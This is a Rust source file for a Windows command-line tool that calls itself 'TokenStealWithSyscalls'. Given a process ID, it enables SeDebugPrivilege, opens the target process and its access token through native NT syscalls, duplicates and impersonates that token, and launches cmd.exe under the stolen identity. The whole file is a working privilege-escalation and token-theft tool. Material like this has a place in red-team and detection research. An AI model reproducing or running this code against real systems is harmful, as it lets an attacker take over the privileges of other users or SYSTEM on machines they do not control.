extern crate ntapi;
extern crate winapi;

use ntapi::ntapi_base::CLIENT_ID;
use ntapi::ntobapi::NtClose;
use ntapi::ntpsapi::NtOpenProcess;
use ntapi::ntpsapi::NtSetInformationThread;
use ntapi::ntpsapi::ThreadImpersonationToken;
use ntapi::ntseapi::NtDuplicateToken;
use ntapi::ntseapi::NtOpenProcessToken;
use ntapi::ntseapi::{NtAdjustPrivilegesToken, SE_DEBUG_PRIVILEGE};
use std::env;
use std::ffi::OsStr;
use std::mem::{size_of, zeroed};
use std::os::windows::ffi::OsStrExt;
use std::process::abort;
use std::ptr::null_mut;
use winapi::shared::ntdef::OBJECT_ATTRIBUTES;
use winapi::um::handleapi::CloseHandle;

use winapi::um::processthreadsapi::{CreateProcessAsUserW, PROCESS_INFORMATION, STARTUPINFOW};
use winapi::um::synchapi::WaitForSingleObject;

use winapi::um::winbase::{INFINITE};
use winapi::um::winnt::SECURITY_DYNAMIC_TRACKING;
use winapi::um::winnt::{
    SecurityImpersonation, TokenImpersonation, HANDLE, LUID, MAXIMUM_ALLOWED, PROCESS_ALL_ACCESS,
    SECURITY_QUALITY_OF_SERVICE, SE_PRIVILEGE_ENABLED, TOKEN_ADJUST_PRIVILEGES, TOKEN_DUPLICATE,
    TOKEN_IMPERSONATE, TOKEN_PRIVILEGES, TOKEN_QUERY,
};
use winapi::um::winuser::SW_SHOW;

fn set_thread_token(thread_handle: HANDLE, token_handle: HANDLE) {
    unsafe {
        let status = NtSetInformationThread(
            thread_handle,
            ThreadImpersonationToken,
            token_handle,
            std::mem::size_of::<HANDLE>() as u32,
        );

        println!("[+]NtSetInformationThread status: {:#02X}", status);

        if status == 0 {
            println!("Successfully impersonated the token.");
        } else {
            abort();
        }
    }
}

fn duplicate_token(existing_token_handle: HANDLE, new_token_handle: &mut HANDLE) {
    unsafe {
        let mut object_attributes = OBJECT_ATTRIBUTES {
            Length: std::mem::size_of::<OBJECT_ATTRIBUTES>() as u32,
            RootDirectory: null_mut(),
            ObjectName: null_mut(),
            Attributes: 0,
            SecurityDescriptor: null_mut(),
            SecurityQualityOfService: null_mut(),
        };
        let _security_quality_of_service = SECURITY_QUALITY_OF_SERVICE {
            Length: std::mem::size_of::<SECURITY_QUALITY_OF_SERVICE>() as u32,
            ImpersonationLevel: SecurityImpersonation,
            ContextTrackingMode: SECURITY_DYNAMIC_TRACKING,
            EffectiveOnly: false.into(),
        };

        let status = NtDuplicateToken(
            existing_token_handle,
            MAXIMUM_ALLOWED,
            &mut object_attributes,
            false.into(), // not effective only
            TokenImpersonation,
            new_token_handle,
        );

        println!("[+]NtDuplicateToken status: {:#02X}", status);

        if status == 0 {
            println!("Successfully duplicated the token.");
        } else {
            abort();
        }
    }
}

fn open_target_token(process_handle: HANDLE, token_handle: &mut HANDLE) {
    unsafe {
        let status = NtOpenProcessToken(
            process_handle,
            TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_IMPERSONATE,
            token_handle,
        );

        println!("[+]NtOpenProcessToken status: {:#02X}", status);

        if status == 0 {
            println!("Successfully opened the token.");
        } else {
            abort();
        }
    }
}

fn open_target_process(pid: u32, process_handle: &mut HANDLE) {
    unsafe {
        let mut object_attributes = OBJECT_ATTRIBUTES {
            Length: std::mem::size_of::<OBJECT_ATTRIBUTES>() as u32,
            RootDirectory: null_mut(),
            ObjectName: null_mut(),
            Attributes: 0,
            SecurityDescriptor: null_mut(),
            SecurityQualityOfService: null_mut(),
        };
        let client_id = CLIENT_ID {
            UniqueProcess: pid as HANDLE,
            UniqueThread: 0 as HANDLE,
        };

        let status = NtOpenProcess(
            process_handle,
            PROCESS_ALL_ACCESS,
            &mut object_attributes,
            &client_id as *const _ as *mut _,
        );

        println!("[+]NtOpenProcess status: {:#02X}", status);

        if status == 0 {
            println!("Successfully opened the process.");
        } else {
            abort();
        }
    }
}

/// Adjusts the specified privilege in the given token.
fn adjust_privileges(token_handle: HANDLE, privilege: u32) {
    let luid = LUID {
        LowPart: privilege,
        HighPart: 0,
    };

    let mut tp = TOKEN_PRIVILEGES {
        PrivilegeCount: 1,
        Privileges: [winapi::um::winnt::LUID_AND_ATTRIBUTES {
            Luid: luid,
            Attributes: SE_PRIVILEGE_ENABLED,
        }],
    };

    unsafe {
        let status = NtAdjustPrivilegesToken(
            token_handle,
            0,
            &mut tp as *mut TOKEN_PRIVILEGES,
            0,
            std::ptr::null_mut(),
            std::ptr::null_mut(),
        );

        println!("[+]NtAdjustPrivilegesToken status: {:#02X}", status);

        if status == 0 {
            println!("Successfully adjusted the privileges.");
        } else {
            abort();
        }
    }
}

fn open_process_token(token_handle: &mut HANDLE) {
    unsafe {
        let status = NtOpenProcessToken(
            -1isize as HANDLE, // Current process
            TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,
            token_handle,
        );

        println!("[+]NtOpenProcessToken status: {:#02X}", status);

        if status == 0 {
            println!("Successfully opened the token.");
        } else {
            abort();
        }
    }
}

fn launch_process_with_token(duplicated_token_handle: HANDLE) {
    let cmd_line_str = "\"C:\\Windows\\system32\\cmd.exe\"";
    let wide_cmd_line: Vec<u16> = OsStr::new(cmd_line_str)
        .encode_wide()
        .chain(Some(0))
        .collect();
    let lp_cmd_line = wide_cmd_line.as_ptr() as *mut _;

    let mut desktop_str = "Winsta0\\Default\0";
    let mut desktop_str = OsStr::new(&mut desktop_str)
        .encode_wide()
        .chain(Some(0))
        .collect::<Vec<u16>>();
    let lp_desktop = desktop_str.as_mut_ptr();

    let mut si: STARTUPINFOW = unsafe { zeroed() };
    si.cb = size_of::<STARTUPINFOW>() as u32;
    si.lpDesktop = lp_desktop; // Use the mutable pointer here
    si.wShowWindow = SW_SHOW as u16;

    let mut pi: PROCESS_INFORMATION = unsafe { zeroed() };

    let result = unsafe {
        CreateProcessAsUserW(
            duplicated_token_handle,
            null_mut(),
            lp_cmd_line,
            null_mut(),
            null_mut(),
            0,
            0,
            null_mut(),
            null_mut(),
            &mut si,
            &mut pi,
        )
    };

    println!("[+]CreateProcessAsUserW result: {:#02X}", result);

    if result == 0 {
        // Handle the error, possibly using GetLastError
    } else {
        unsafe {
            WaitForSingleObject(pi.hProcess, INFINITE);
            CloseHandle(pi.hProcess);
        }
    }
}

fn main() {
    let args: Vec<String> = env::args().collect();
    if args.len() != 2 {
        println!("Usage: TokenStealWithSyscalls PID");
        return;
    }

    let pid: u64 = args[1].parse().expect("PID should be a number.");

    println!("[+]Stealing token from process #{}.", pid);

    let mut current_token_handle: HANDLE = null_mut();
    open_process_token(&mut current_token_handle);
    adjust_privileges(current_token_handle, SE_DEBUG_PRIVILEGE as u32);

    let mut target_process_handle: HANDLE = null_mut();
    open_target_process(pid as u32, &mut target_process_handle);
    let mut target_token_handle: HANDLE = null_mut();
    open_target_token(target_process_handle, &mut target_token_handle);

    let mut duplicated_token_handle: HANDLE = null_mut();
    duplicate_token(target_token_handle, &mut duplicated_token_handle);
    adjust_privileges(duplicated_token_handle, SE_DEBUG_PRIVILEGE as u32);

    // Get a handle to the current thread
    let current_thread_handle = unsafe { winapi::um::processthreadsapi::GetCurrentThread() };

    set_thread_token(current_thread_handle, target_token_handle);

    // Launch a new process with the duplicated token
    launch_process_with_token(duplicated_token_handle);

    // Close all handles
    unsafe {
        NtClose(current_token_handle);
        NtClose(target_process_handle);
        NtClose(target_token_handle);
        NtClose(duplicated_token_handle);
    }
}
